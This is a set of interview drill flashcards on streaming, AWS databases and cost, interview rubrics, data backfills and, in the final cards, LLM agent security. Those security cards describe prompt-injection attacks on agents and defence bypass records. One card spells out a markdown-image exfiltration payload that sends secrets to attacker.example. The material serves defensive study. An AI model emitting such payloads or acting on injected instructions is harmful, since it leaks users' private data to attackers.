drills.q: Explain precisely why enabling Kafka's idempotent producer (enable.idempotence=true) does not make your Structured Streaming-to-Kafka pipeline exactly-once end to end.
drills.a: Idempotent producer semantics operate at the scope of a single producer session's retries — they prevent a network-level retry of the same in-flight message from producing a duplicate. They have no visibility into or memory of a Spark micro-batch as a unit; if the whole batch is retried after a Spark restart (a new producer session attempts to resend rows the previous attempt already sent), idempotence within the new session does nothing to detect that the previous session already delivered those messages. The unit of duplication (a whole retried micro-batch after restart) is a different scope than the unit idempotence protects (a single message retry within one session).

drills.q: State size for a job has been growing steadily for a week with no watermark declared. You add a correctly-sized watermark today. Will state size immediately drop? Why or why not?
drills.a: Not immediately for all existing state — windows already open and older than the new watermark's cutoff will close and drop on the next trigger once the watermark logic evaluates them, but very recent/still-legitimately-open windows remain live as expected. Practically, most of the week's accumulated backlog of long-stale windows should clear within the first few triggers after the watermark is added, but genuinely recent, still-open windows continue to hold state exactly as the watermark design intends — the fix stops further unbounded growth immediately, and clears the specific stale backlog over the first several triggers rather than instantaneously.

drills.q: You must run an otherwise-continuous stateful streaming aggregation only once per hour via Airflow, catching up on however much backlog has accumulated since the last run. Which trigger do you use, and what do you still need to configure correctly for correctness?
drills.a: Trigger.AvailableNow(), which drains the available backlog across multiple appropriately-sized batches (respecting rate limits like maxOffsetsPerTrigger) instead of forcing everything through one oversized batch the way the deprecated Trigger.Once() would. You still need the watermark sized correctly for the aggregation's real lateness tolerance — trigger type is orthogonal to watermark/state semantics, and a stateful query run via AvailableNow still needs its state bounded exactly as it would running continuously.

drills.q: A colleague says 'we don't need to worry about exactly-once, Structured Streaming handles it.' Give the precise correction, referencing what the engine actually guarantees versus what the sink must provide.
drills.a: The engine guarantees exactly-once processing: offsets and operator state are committed atomically per batch via the checkpoint, so a restart never reprocesses a committed batch or skips an uncommitted one. It does not guarantee the sink write is exactly-once, because the sink write and the checkpoint commit are separate steps; a crash between them can duplicate output. Whether the pipeline is truly exactly-once end to end depends on whether the specific sink in use is idempotent (e.g. keyed upsert) or transactional (e.g. Delta txnAppId/txnVersion, or custom Kafka transactional foreachBatch logic) — 'Structured Streaming handles it' is only true once you've verified which mechanism the sink provides.

drills.q: Design a dead-letter strategy for records dropped by a watermark that's tuned tightly for latency reasons, where occasional data loss is unacceptable but low latency for the common case is required.
drills.a: Keep the tight watermark on the primary aggregation path for latency. Separately, run a parallel branch (or a second read of the same source) with no watermark, or a much looser one, that filters specifically for records whose event-time falls before the primary watermark's cutoff, and routes those to a dead-letter sink (a separate table or topic) for reprocessing or reconciliation. This way the low-latency path stays fast and bounded, while genuinely late records are captured rather than silently discarded, at the cost of a second read/processing path and a reconciliation step to merge dead-letter records back into the final dataset later.

drills.q: State Aurora's replication factor and quorum numbers for reads and writes.
drills.a: 6 copies across 3 AZs (2 per AZ). Writes need a 4-of-6 quorum, reads need a 3-of-6 quorum. 4+3>6 guarantees overlap between any read and write quorum.

drills.q: Why is Aurora failover faster than standard RDS Multi-AZ failover, mechanically?
drills.a: Aurora replicas already share the writer's distributed storage layer, so failover is just promoting a reader's role -- no separate standby storage to catch up or rebuild. Standard RDS Multi-AZ promotes a synchronously-replicated standby with its own separate storage volume and redirects DNS, which takes longer (1-2 min vs Aurora's typically under 60s).

drills.q: A DynamoDB table throttles on specific items while CloudWatch shows consumed capacity well under the provisioned total. Diagnose and explain why adding more table-wide capacity won't fix it.
drills.a: A hot partition -- one partition is hitting its hard ceiling of 3,000 RCU/1,000 WCU per second regardless of the table's overall headroom. Adding table-wide capacity doesn't raise any individual partition's ceiling; the fix is redesigning the partition key for better distribution (random/hashed suffix, sharding the hot key).

drills.q: Is single-table DynamoDB design a best practice to recommend by default? Justify.
drills.a: No. It's a deliberate tradeoff for high-scale, access-pattern-stable workloads with real DynamoDB expertise on the team. For most teams, multi-table design is easier to reason about and evolve as access patterns change -- even the pattern's original advocate has publicly acknowledged the backlash against applying it as a default.

drills.q: Why would you choose a GSI over an LSI for a new secondary access pattern you're not fully certain about yet?
drills.a: LSIs can only be defined at table creation time and can never be added or removed afterward, while GSIs can be added, modified, or removed anytime with automatic backfill. Unless you specifically need an LSI's strongly-consistent-read capability, the flexibility of GSIs makes them the safer default for an uncertain future access pattern.

drills.q: How much more expensive is a DynamoDB TransactWriteItems call than an equivalent plain PutItem, and when do you actually need it?
drills.a: 2x the capacity units. Needed only when true cross-item or cross-table atomicity is required (all-or-nothing across multiple items); for single-item idempotency, a conditional write (ConditionExpression) provides the same safety at half the capacity cost.

drills.q: What changed with Aurora Serverless v2 in November 2024, and what's the tradeoff of the new capability?
drills.a: It gained scale-to-zero: a database with no active connections for a configurable idle period pauses entirely, billing only storage, and resumes in roughly 15 seconds on the next connection. The tradeoff is that 15-second cold-resume latency is visible to whatever makes the first request after an idle period -- fine for internal/dev workloads, likely unacceptable for a synchronous customer-facing path with continuous traffic.

drills.q: A team wants to migrate a MongoDB app to DocumentDB purely for cost. What specific compatibility gaps must be tested first?
drills.a: No retryable writes (app-level retry/error-handling must be added explicitly), no $graphLookup aggregation stage, and missing or limited support for capped collections, GridFS, text indexes, vector search indexes, and partial indexes, among others. CRUD and most indexing generally work unchanged, but every aggregation pipeline in actual use needs explicit testing against DocumentDB before committing to the migration.

drills.q: Why did ElastiCache shift its default engine recommendation to Valkey, and what does that mean for existing Redis OSS users?
drills.a: Redis's license changed to SSPL/RSALv2 in 2024 and gained an AGPLv3 option in 2025, moving it away from a permissive open-source license. Valkey is the Linux Foundation-governed BSD-licensed fork from Redis OSS 7.2 that ElastiCache now defaults to for new deployments. ElastiCache only carries legacy Redis OSS support up to version 7.2, so anyone wanting newer Redis-compatible features must move to Valkey.

drills.q: When is Neptune (or any graph database) the right architectural choice over a relational database with join tables?
drills.a: When the dominant query shape is deep, multi-hop traversal -- fraud-ring detection, recommendation collaborative filtering, social-graph queries -- where relational join cost grows with hop count but graph traversal cost per hop stays roughly constant. Wrong for workloads that are mostly single-entity lookups with shallow joins, where relational remains simpler and cheaper to operate.

drills.q: How did the November 2024 DynamoDB price cut change the on-demand vs provisioned decision, and what workload shape still favors provisioned?
drills.a: On-demand pricing dropped substantially, making it the recommended default for unpredictable or lower-volume workloads. Sustained, predictable throughput at realistic utilization (~70%+) still favors provisioned with auto-scaling, which remains commonly 3-4x cheaper at that utilization level, with the gap widening further near 100% utilization.

drills.q: A CloudWatch bill jumps from $200 to $3,000/month right after a team adds 'more detailed per-user metrics.' Diagnose the mechanism precisely.
drills.a: A new metric dimension carrying high-cardinality values (e.g. userId) turns one logical metric into one billable metric PER distinct dimension value, since CloudWatch bills per unique combination of metric name, namespace, and dimension values. 10,000 distinct userIds on one metric name is 10,000 separate billable metrics at $0.30/month each in the first tier -- roughly $3,000/month, matching the described jump.

drills.q: Why does 'the first copy of CloudTrail management events per region is free' not guarantee a team pays nothing for CloudTrail?
drills.a: The free tier applies to the first trail's management events per region -- an overlapping second trail (e.g. an existing single-region trail plus a newly added multi-region trail both covering the same region) means the second copy of those same events is billed, unrelated to whether data events are ever touched. This is the '2nd-copy trap,' purely a trail-configuration issue.

drills.q: A team needs per-user debugging visibility but can't afford per-user CloudWatch metrics. What's the alternative architecture?
drills.a: Emit per-user detail as structured logs (JSON, optionally via Embedded Metric Format) instead of publishing per-user CloudWatch metrics. Query the per-user detail on demand via CloudWatch Logs Insights when actually debugging, rather than paying for a permanently-billed time series per user regardless of whether anyone looks at it. Keep the actual CloudWatch metrics aggregated to low-cardinality dimensions like route or status class.

drills.q: Would you recommend instrumenting a brand-new microservice directly against the X-Ray SDK in 2026? Why or why not, and what's the alternative?
drills.a: No -- the X-Ray SDK and daemon entered maintenance mode in February 2026, with AWS explicitly steering new instrumentation toward OpenTelemetry. OpenTelemetry can still export traces to X-Ray as a backend (or to any other OTel-compatible system), giving the same tracing capability with more vendor flexibility and avoiding a foreseeable future migration off a component that isn't receiving further investment.

drills.q: A compliance team asks for 'full audit logging on all S3 access across the account.' What's the risk of implementing this literally, and how do you scope it responsibly?
drills.a: Enabling S3 data events account-wide with no per-bucket scoping, at any meaningful access volume (an active data lake or ML pipeline can see millions of GET/PUT calls daily), can produce a CloudTrail bill that dwarfs the rest of the observability stack, since data events are billed at $0.10/100,000 from the very first event with no free tier. Responsible scoping: clarify whether the actual requirement covers every bucket or a defined sensitive-data scope, and use advanced event selectors to limit data-event logging to the specific buckets/prefixes that genuinely need it, rather than enabling it broadly by default.

drills.q: A Well-Architected review six months ago produced a long list of findings, and nothing on it has been fixed. What went wrong structurally, and how do you fix the process, not just the findings?
drills.a: The review was almost certainly treated as a one-time compliance exercise rather than a tracked backlog -- findings without prioritization (against AWS's own High-Risk Issue flag and actual blast radius) and without assigned owners and deadlines are functionally equivalent to not having done the review. Fix: re-run the review, prioritize findings explicitly, assign owners, and schedule a recurring re-review cadence so the framework functions as an ongoing discipline rather than a point-in-time audit.

drills.q: Why is 'idle provisioned capacity' (an oversized SageMaker endpoint or Redshift cluster) one of the hardest cost problems to catch with automated tooling like Cost Anomaly Detection?
drills.a: Cost Anomaly Detection is tuned to flag deviations from a resource's OWN historical spend baseline. A SageMaker endpoint or Redshift cluster provisioned for peak and simply always running at that size doesn't deviate from its own history -- it looks like steady, expected spend, not an anomaly. Catching it requires a separate utilization-based review comparing provisioned capacity against actual usage patterns, which is a different kind of check than anomaly detection provides.

drills.q: Your CFO gives you limited engineering time this quarter and asks for the single highest-leverage cost-observability improvement. What do you recommend and why not one of the specific point fixes (NAT, CloudTrail scoping, Athena partitioning)?
drills.a: Enforce cost allocation tagging at resource creation (via tag policies/SCPs) and enable Cost Anomaly Detection scoped to those tag groups. Tagging is the structural prerequisite for almost every other cost-visibility tool -- Cost Explorer filtering, Budgets scoping, and anomaly-detection granularity all depend on it, and untagged historical spend can never be retroactively attributed. The specific point fixes are real and worth doing, but they address symptoms already found; tagging makes every FUTURE anomaly (including ones not yet discovered) attributable and actionable quickly, which compounds in value in a way a one-time point fix does not.

drills.q: Explain why a finding like 'no autoscaling, capacity provisioned for peak' can legitimately appear under both the performance-efficiency and cost-optimization pillars of a Well-Architected review, and what that implies for prioritization.
drills.a: It violates the 'stop guessing capacity' cross-pillar design principle -- provisioning for an assumed worst case rather than autoscaling to real usage is simultaneously a performance-efficiency concern (capacity mismatch under variable load) and a cost-optimization concern (idle provisioned capacity is one of the top line items dominating real AI/data bills). A finding with cross-pillar impact should generally be weighted higher in remediation priority than an isolated single-pillar finding, since fixing it resolves two review findings at once and the pillars aren't independent silos.

drills.q: What's the Logs Insights cost-optimization lever, and how is it similar to and different from Athena's partitioning story?
drills.a: Logs Insights bills by volume of log data scanned per query, similar in shape to Athena's per-TB-scanned model, so the primary lever is scoping queries tightly by time range and log group rather than running broad, unscoped queries. It's different from Athena's story in that structuring log content as JSON improves query precision but does NOT reduce the bytes-scanned billing the way Parquet's columnar format reduces what Athena scans -- Logs Insights has no equivalent to 'read only the referenced columns.' The primary lever here is query scoping, not data format.

drills.q: Recite the three mandatory follow-ups asked after every story in this round.
drills.a: 1) The number and how it was measured. 2) What was considered and rejected, and its real cost. 3) What you'd do differently, specifically.

drills.q: State the asymmetric STAR time shape as percentages.
drills.a: Situation 10%, Task 10%, Action 50%, Result 15%, rejected alternative 10%, redo 5%. Action carries the score.

drills.q: A candidate says 'we decided to migrate the service and it went well.' What's wrong with this as an Action section, and what's the fix?
drills.a: No isolable personal contribution -- 'we' with no specific decision attributed to the speaker. Fix: 'I proposed the migration and decided X because Y' -- first-person-singular with a specific mechanism.

drills.q: A candidate cites '~25% engagement uplift' and can't answer how it was measured. What should the honest answer have been prepared as?
drills.a: State the metric definition first, the comparison design second (holdout vs pre/post), the confounder that couldn't be removed third -- and if it was pre/post with no holdout, say so plainly and name why a holdout wasn't available.

drills.q: What's the difference between a claimed story and an assigned story, and which should you lead with at staff+?
drills.a: Assigned: told to do it. Claimed: noticed the problem and proposed the fix yourself. Lead with claimed stories at staff+ since they're stronger evidence of the level.

drills.q: A candidate's 'what would you do differently' answer is 'I'd probably do the exact same thing, it worked out great.' What's wrong, and what should replace it?
drills.a: This is disguised praise, not a retrospective -- it costs nothing to admit. Replace with a specific, non-trivial revision that has a real cost to name (e.g. 'I should have built the eval before the architecture decision, not after').

drills.q: A candidate presents a single-team platform story as evidence of org-wide impact for a Meta E6-style question. What follow-up exposes this, and what's the honest fix?
drills.a: 'How many teams, and did they adopt it because you convinced them or because you owned the decision?' Fix: use a genuinely cross-team story instead, or state the scope honestly and let it be a smaller, truer answer.

drills.q: How should the interviewer's drilling style change if the candidate names Netflix as the target company vs. the Amazon default?
drills.a: Amazon default: Bar Raiser drills for depth until something breaks. Netflix: expects peer-level candor with no scaffolding, conversational delivery, comfortable with the candidate disagreeing with the interviewer once, well.

drills.q: What's the required prepared answer for a 2026-era behavioral loop that didn't exist in 2024 prep, and what makes an answer to it weak?
drills.a: How you work with AI coding tools plus a concrete override instance. Weak: generic 'I always review AI code carefully' with no category rule (what's accepted lightly vs. verified deeply) and no real example.

drills.q: What single behavior in a story ends the round regardless of how good the content is?
drills.a: Naming a Leadership Principle or competency explicitly while telling it ('this shows my ownership') instead of simply exhibiting the behavior -- narrating the rubric rather than meeting it.

drills.q: What defines the STRONG HIRE band (17-20/20) for this round?
drills.a: Every story has a number with stated measurement method, a real rejected alternative with its cost, and a specific non-trivial retrospective -- all volunteered before the mandatory follow-ups are even asked, consistently first-person-singular, scope stated honestly.

drills.q: Recite the 9-phase design sequence with its 45-minute timebox.
drills.a: Restate(2) / requirements(5) / numbers(5) / API(5) / data model(7) / architecture(8) / scale(6) / failure(5) / wrap(2).

drills.q: Why compute a capacity number before you know what decision it will drive?
drills.a: You shouldn't -- state the use before computing it ('I need QPS to decide if one Postgres primary suffices'). Numbers that never feed a downstream decision are theater, not rigor.

drills.q: URL shortener: what's the actual hard problem, and why does hashing-and-retry degrade?
drills.a: Short-code generation without collision at scale. Random-and-retry degrades as the keyspace fills (collision rate rises); prefer base62 encoding of an auto-incrementing ID or a pre-generated code pool.

drills.q: Distributed rate limiter: two requests hit two different API servers in the same millisecond, both check Redis under the limit, both proceed. What's the fix?
drills.a: An atomic check-and-increment (a Lua script in Redis, or INCR with expiry evaluated atomically) instead of a separate GET-then-SET, which is the actual race.

drills.q: Real-time leaderboard, 10M DAU, needs top-100 and any user's rank on demand. What data structure, and why does a SQL window-function-per-request approach fail?
drills.a: A sorted set (Redis ZSET) -- O(log n) insert/update, O(log n + k) range query, O(log n) rank lookup. A live ranked SQL query or full re-sort per write can't keep up with this write volume.

drills.q: 200 leaderboards, some with 10 users, some with 2M, sharing infrastructure. Does one Redis ZSET per leaderboard still work?
drills.a: Not uniformly -- this becomes a sharding/resource-allocation problem, not a single-leaderboard scaling problem. Colocate small leaderboards, isolate or further partition large ones.

drills.q: Support ticket volume triples overnight; your GenAI cost triples with it. What are your real levers?
drills.a: Semantic caching (keyed on query embedding, not exact match) for repeated/similar queries, a cheaper model for first-pass triage with escalation only when needed, or a hard per-tenant/per-hour cost ceiling with graceful degradation -- not 'just pay for it.'

drills.q: Two customers add the last unit of an item to their cart within 50ms of each other. Trace exactly what happens and what the losing customer sees.
drills.a: One request acquires a reservation/lock on the last unit first; the second request's response must be an honest 'out of stock,' not a silent oversell from a race. 'The database handles it' is not an answer -- name the mechanism (transaction with row-level lock, or a reservation token with TTL).

drills.q: Finance wants dollar cost per million tokens split by interactive vs batch workload, and you don't have it. What should have existed already?
drills.a: Per-workload cost attribution requires the batch and interactive paths to be separately instrumented and ideally separately billed infrastructure from day one -- retrofitting cost attribution onto a shared, unlabeled GPU pool afterward is expensive and imprecise.

drills.q: What single line does an interviewer use at minute 20 if there's no data model yet, and what should you do in response?
drills.a: 'We're almost halfway through and I don't have a data model. Let's move.' Response: stop elaborating requirements/API, commit to tables and a partition key immediately, derived from the access pattern already stated.

drills.q: What defines the NO HIRE band (5-8/20) in the design round rubric?
drills.a: Boxes drawn early with no derivation; no numbers, or numbers never referenced again; cannot answer 'why this and not X' for any major decision; struggles to recover from an interrupt even after a second prompt.

drills.q: State the agent loop and name three valid stop conditions.
drills.a: Observe -> reason -> act -> observe, repeat. Stop conditions: max-iteration cap, model-emitted 'done' signal, cost/token budget ceiling -- need at least two simultaneously.

drills.q: Give the Reciprocal Rank Fusion formula for hybrid search and why naive score averaging is a bug.
drills.a: score = sum over ranked lists of 1/(k+rank_i), k~60. Naive averaging is a bug because raw BM25 scores and cosine similarity scales aren't comparable -- you'd be averaging incommensurable numbers.

drills.q: Retrieval recall looks fine but answer quality is bad. How do you tell if it's a chunking problem?
drills.a: Inspect the actual retrieved chunk text for the failing queries -- check whether the answer was split across a chunk boundary such that the model only saw half of it, rather than assuming the generation step is at fault.

drills.q: Why can't you just use a cross-encoder for the whole corpus and skip bi-encoder retrieval?
drills.a: There's nothing to precompute for a cross-encoder -- the score depends jointly on the query, unknown until query time. A full transformer forward pass per (query, document) across a million-row corpus is computationally infeasible at any real-time latency budget.

drills.q: An LLM-judge says groundedness is 95% but users report made-up answers weekly. First hypothesis?
drills.a: The judge model may be systematically miscalibrated on a specific failure category (e.g. numeric hallucinations, hard for another LLM to catch without doing the arithmetic itself) -- stratify the eval by failure category rather than trust the aggregate number.

drills.q: When is long context actually the right call over RAG?
drills.a: When the task requires reasoning across the ENTIRE document coherently (e.g. summarizing overall contract risk) rather than retrieving discrete facts, or when the corpus is small enough that retrieval adds latency/complexity with no precision benefit.

drills.q: Design the enforcement point: a webpage the agent summarizes contains an injected instruction to change a shipping address. Your system prompt already forbids unauthorized address changes. Does the system prompt save you?
drills.a: Only partially and only if enforcement is ALSO implemented outside the model -- a code-level check that the new address matches an allowlisted pattern or requires fresh user confirmation before the tool executes. A system prompt is a strong prior, not a guarantee, for an irreversible action.

drills.q: Constrained decoding guarantees valid JSON syntax. Does it guarantee the agent picked the right tool?
drills.a: No -- constrained decoding constrains the SHAPE of the output, not its correctness. A syntactically perfect tool call with the wrong tool name or hallucinated arguments passes every schema check while being functionally wrong. Syntactic and semantic correctness are two separate checks.

drills.q: You built a 3-agent A2A+FastMCP system. Which two would you merge if redoing it, and what's the test?
drills.a: Merge agents that always run in strict sequence on the same input with no independent retry value (e.g. transcript processing + chunking). Keep separate agents whose failure modes, scaling profiles, or retry semantics genuinely differ (e.g. gap detection, different trigger/cadence). Refusing to name a merge candidate reads as attachment to your own design.

drills.q: Your bounded query-reformulation retry silently drops a constraint (e.g. 'cheap flight to Paris' becomes 'flight to Paris'). How do you catch this class of bug?
drills.a: An eval or invariant check that verifies reformulated queries preserve the original query's key constraints (constraint-extraction compared before/after reformulation, or logging + periodically auditing reformulation diffs) -- don't just trust the rewrite is safe by default.

drills.q: What's the calibration difference for scoring this round vs. the ML/DL round?
drills.a: GenAI is the student's strongest domain, so the bar is calibrated upward -- a HIRE here should be harder to earn than a HIRE on the ML round, and a shallow LEAN HIRE-level pass here is treated as a genuine concern, not an acceptable outcome.

drills.q: Who picks the bullets to drill in this round, and what does that imply about preparation?
drills.a: The interviewer picks, not the candidate -- every bullet needs real depth prepared, not just the 3 rehearsed favorites.

drills.q: What resume factual error should be caught and corrected unprompted, and what are the correct values?
drills.a: 'ml.4xlarge' and 'g4.2xlarge' aren't real SageMaker instances -- correct to ml.g4dn.2xlarge and ml.g5.xlarge, stated cleanly without defensiveness.

drills.q: 812 lines of Python replaced 3,447 lines of Java. What's the strong answer to 'convince me nothing was silently dropped'?
drills.a: Most of the 3,447 lines was Spring Batch scaffolding (readers/writers/processors/job config), not business logic -- that's why 812 lines is a faithful port. Plus a real verification method: row-count/checksum parity or a parallel run diffing old vs new output.

drills.q: For the 22-locale bullet, what's the strong rejection reason for 'why not just auto-detect language from input text'?
drills.a: Detection on short strings (a skill name, not a paragraph) is unreliable, and a wrong auto-detection is SILENT, whereas a missing/malformed header is diagnosable. Use detection only as a signal, never as the source of truth.

drills.q: What's the honest answer when asked for the bandit's isolated attributable share of the ~25% engagement number?
drills.a: Admit it wasn't cleanly isolated from the rest of the platform's contribution -- claiming a clean attribution that wasn't actually measured is worse than admitting the confound.

drills.q: Why is 'we added retries and locking' the WRONG answer to how the MongoDB race condition was fixed?
drills.a: Retries and application-level locking are explicitly the REJECTED alternatives in the real story (locking serializes the hot path; retries don't fix a non-atomic read-modify-write). The actual fix was an atomic database-level update with a filter condition.

drills.q: What's the coherence check for the 'why are you leaving' answer, and what does a weak vs strong response to it reveal?
drills.a: 'If your current company offered you this exact role and scope, would you stay?' A weak response reveals motivation is purely compensation with nothing structural. A strong response names something the current employer structurally cannot offer regardless of role or pay.

drills.q: What's the hardest scope-calibration question in this round, and why is an honest thin answer better than a manufactured one?
drills.a: 'Name one thing outside your own code that changed because of a decision you made.' This is a genuinely thin area on this resume -- 'I have one strong example, not a second as strong' is a legitimate, credible answer; inventing a second example under pressure is worse.

drills.q: For the manager-disagreement question, what does 'would you have escalated further if overruled by your manager's manager' actually test?
drills.a: Whether the original disagreement was a genuinely held technical position or a safe, low-stakes battle -- the strong answer names a real threshold for when to let something go vs. escalate further.

drills.q: Why does this round place last in a full 5-round loop, after coding, design, AI depth, and behavioral?
drills.a: It mirrors how real onsites close (with the person defending the hire internally), and it tests whether depth and honesty persist after cumulative fatigue from four prior rounds, not just when the candidate is fresh.

drills.q: What single behavior is a bigger red flag than getting a resume fact wrong in the first place?
drills.a: Getting defensive about, or not noticing, a direct correction from the interviewer -- failing to cleanly absorb feedback is worse than the original error.

drills.q: A backfill for March 2026 uses the pipeline's current code, which includes a business-rule change deployed in June 2026. What's the risk, and how do you decide if it's acceptable?
drills.a: The backfill will apply June's business rule to March's data, which may misrepresent what actually happened in March if that rule didn't exist then. Decide by checking whether the change is a genuine bug fix (safe/desirable to apply retroactively) or a legitimate new business rule that shouldn't apply to a period before it existed (not safe to backfill with).

drills.q: A backfill script runs `INSERT INTO fact_sales SELECT ... WHERE sale_date = '2026-03-15'` and gets rerun after a transient failure. What goes wrong, and what's the one-line fix?
drills.a: Running it twice appends the same day's data twice, doubling the rows. Fix: use `INSERT OVERWRITE TABLE fact_sales PARTITION (sale_date='2026-03-15') SELECT ...` so a rerun replaces the partition instead of appending to it.

drills.q: A team backfills 12 months of daily partitions by launching all 365 jobs at once against a shared Snowflake warehouse. What happens, and what control should have been in place?
drills.a: The backfill saturates shared warehouse compute, degrading or blocking unrelated teams' concurrent production queries — a self-inflicted denial-of-service. A concurrency limit (e.g. max_active_runs=5 in Airflow) should bound how many date-partitions run simultaneously, and the backfill should ideally run during a low-traffic window or on isolated compute.

drills.q: A backfill of a running-total (cumulative) revenue metric is parallelized across dates for speed. What breaks, and what's the fix?
drills.a: Each day's cumulative value depends on the prior day's already-computed total; parallelizing means some days compute their running total against a stale or missing prior-day base, producing wrong cumulative numbers. Fix: process cumulative/dependent partitions in strict chronological order, sacrificing parallelism for correctness; only genuinely independent daily aggregates can safely parallelize.

drills.q: A backfill job dies after processing 40 of 100 date partitions. Two weeks later, a support ticket reports an unexplained step-change in a dashboard's trend line. Connect these two events and describe the diagnostic path.
drills.a: The partially-applied backfill left the table in a mixed state — 40 partitions reflect new/corrected logic, 60 still reflect old data — producing exactly the discontinuity the ticket describes at the boundary date. Diagnose by checking the backfill's audit/run log for which partitions actually succeeded before it failed, then resume processing from the last successful partition rather than restarting or assuming the whole range completed.

drills.q: A backfill is needed to fix a currency-conversion bug affecting six months of revenue. A junior engineer proposes joining historical transactions to the current exchange-rate table. What's wrong with this, and what's the correct approach?
drills.a: Exchange rates fluctuate daily; joining to 'current' rates applies today's rate to six-month-old transactions, producing plausible-looking but factually wrong historical revenue — a second new bug on top of fixing the first. Correct approach: use a point-in-time-correct (SCD Type 2) exchange-rate dimension joined with an as-of filter matching each transaction's actual date, so only the intended conversion-logic bug is fixed.

drills.q: A vendor's API only retains 90 days of historical data, and a data gap from 8 months ago is discovered. An engineer proposes interpolating the missing values from surrounding data. Is this the right call?
drills.a: Generally no — the source data needed to backfill correctly no longer exists, so an interpolated approximation risks presenting fabricated-looking data as if it were real historical fact. The better answer is usually to document the gap explicitly (in table metadata or a known-issues log) rather than manufacture data that looks more authoritative than it is.

drills.q: A pipeline includes a computed column that embeds `CURRENT_TIMESTAMP` inside a business-logic calculation (not just as an audit metadata field). Why does this break the ability to safely backfill or verify idempotency?
drills.a: Every rerun of the same historical partition produces a different value purely because wall-clock time differs between runs, even though nothing about the underlying business logic changed — making it impossible to distinguish a genuine data discrepancy from expected non-determinism. Metadata columns like processed_at are fine; the problem is when the actual business calculation itself depends on the rerun's wall-clock time rather than the historical date being processed.

drills.q: What's the difference between a scheduled 'reprocessing window' for late-arriving data and an ad hoc backfill, and why shouldn't both require the same level of review?
drills.a: A reprocessing window (e.g. 'revenue is final after 3 days') is a planned, small, automatic replay built into normal pipeline operation with a deliberately bounded and predictable scope. An ad hoc backfill is triggered by discovering an unplanned gap or bug, is manually initiated, and can have unpredictable scope. Because the reprocessing window's blast radius is already constrained by design, treating every run of it as a full manual backfill review would be needless overhead.

drills.q: A team wants to let any engineer self-service trigger backfills without platform-team review. Make the argument against unconditional self-service, and propose a middle ground.
drills.a: Backfills carry compounding risks (code/reference-data drift, warehouse saturation, replay corruption of already-relied-upon data) that look deceptively simple ('just rerun for these dates'), so unreviewed self-service makes it easy to trigger real damage without understanding it. Middle ground: allow self-service for well-understood, low-risk cases (genuine gaps in low-traffic tables, using tooling that enforces idempotent overwrite and concurrency limits automatically), but require review for anything touching business-critical/externally-reported tables or classified as a replay rather than a backfill.

drills.q: How does lakehouse time-travel (Delta Lake or Iceberg) change how you'd verify what a backfill actually changed, compared to relying only on periodic backups?
drills.a: Time-travel lets you query the table's exact state immediately before the backfill and diff it against the current state directly, as a query, rather than provisioning and restoring from a separate backup — making it fast enough to verify routinely rather than only during a post-incident investigation. It complements, but doesn't replace, an audit log that records who ran the backfill, when, why, and with what code version.

drills.q: Define prompt injection in one sentence and say why it's structural, not a bug.
drills.a: Untrusted input alters the model's behavior because trusted instructions and untrusted data share one token stream and the model cannot reliably tell who is speaking. It's structural (named after SQL injection) because the control channel and data channel are the same channel â€” there is no in-band fix, only out-of-band controls at the action layer.

drills.q: Direct vs indirect injection vs jailbreaking â€” one line each, with the ATLAS mapping.
drills.a: Jailbreak: the user attacks the model's safety protocols directly (ATLAS AML.T0054). Direct injection: user input alters your application's behavior (AML.T0051.000). Indirect injection: instructions planted in content the agent reads â€” tool results, RAG docs, emails, issue titles (AML.T0051.001) â€” the agent-era threat because the attacker never talks to the agent.

drills.q: Recite the OWASP LLM Top 10 (2025) in order. Which item is the multiplier and why?
drills.a: L01 Prompt Injection, L02 Sensitive Info Disclosure, L03 Supply Chain, L04 Data/Model Poisoning, L05 Improper Output Handling, L06 Excessive Agency, L07 System Prompt Leakage, L08 Vector/Embedding Weaknesses, L09 Misinformation, L10 Unbounded Consumption. L06 is the multiplier: every other risk's realized severity scales with how much privilege, autonomy, and tool breadth the agent has â€” an L01 injection into a chatbot embarrasses; into an agent with write tools it's an incident.

drills.q: Walk through the canonical URL-based exfiltration attack and the earliest public instance.
drills.a: Get the model to emit a URL with private data embedded â€” classically a markdown image `![x](https://attacker.example/log?d=<secrets>)`; the client's own fetch carries the data out. Rehberger, April 2023 against ChatGPT. 2026 variants: Copilot Cowork emailing the user's own inbox with external images plus OneDrive pre-authenticated download links; Claude Cowork uploading files to the allowlisted api.anthropic.com/v1/files using an attacker-supplied API key.

drills.q: Why does 'ignore instructions in tool results' in the system prompt not count as a control?
drills.a: A prompt is a suggestion; a control is deterministic code that makes the action impossible. No speaker separation exists in context â€” role-confusion research shows models follow style over role tags, and destyling attacks alone changed success 61%â†’10%. The 2026 record: 0/720 on a held-out vendor eval, then 60-80% adaptive break of the same shipped system weeks later. Every in-band defense is a probabilistic classifier with a bypass record.

drills.q: Design the permission ladder for tools: search_email, get_customer, file_ticket, send_reply, issue_refund, delete_record.
drills.a: search_email, get_customer: read_only, auto-run, logged. file_ticket: reversible internal write, auto-run with idempotency key, immutable audit. send_reply: external side effect â€” approval or a capability-shaped tool (existing thread participants only, no new recipients/URLs). issue_refund: financial â€” dual control, agent prepares / human executes in a different authed session, amount caps, never blind retry. delete_record: destructive â€” human + typed confirmation constant + freshness window (~120s); approval is for THIS action NOW. Unknown tools default destructive; enforce in the dispatcher, not the prompt.

drills.q: Explain CaMeL's core mechanism and its costs.
drills.a: Reframe injection as information-flow control: a privileged 'security model' that only ever sees trusted labels decides authorization, while a quarantined parser model extracts values from untrusted content â€” so untrusted data can influence values passed to tools but can never authorize actions. Costs: a 4-8x system redesign (two models, structured metadata everywhere) and added latency. It's the strongest published 'impossible by construction' design â€” the direction for genuinely high-stakes agents, not a drop-in library.

drills.q: Your approval queue is being rubber-stamped. Give the evidence and the fix.
drills.a: Evidence: the 1,053-tester study â€” humans refused a clearly dangerous command only 13.6% of the time (auto-mode classifiers blocked 89%); approval p50 under ~5s on decisions needing 45-90s; near-zero rejection rate; bulk-approve usage. Fix: fewer, higher-stakes gates so attention concentrates; computed diffs instead of intents; remove bulk-approve on irreversible classes; and reclassify reversible+internal actions back to auto-run. If a classifier pre-screens the queue, it gates the queue, never the destructive tier itself.

drills.q: Reconcile: vendor eval shows 0/720 injections blocked; independent researcher reports 60-80% success three weeks later.
drills.a: Both true: the eval measured a held-out attack distribution (72 scenarios, 720 attempts, third-party, July 2026 models) â€” an upper bound on tested attacks; the researcher measured the NEXT attack (zip archive whose extracted struct.py shadows a stdlib import â€” a confused-environment attack no content classifier recognizes) â€” a lower bound on capability. Structurally, trust the break more: it proves possibility; an eval only proves coverage. Deploy the classifier as depth (it kills commodity attacks, 86%â†’4.4% class results are real), keep dispatcher tiers + egress + sandbox as the actual boundary.

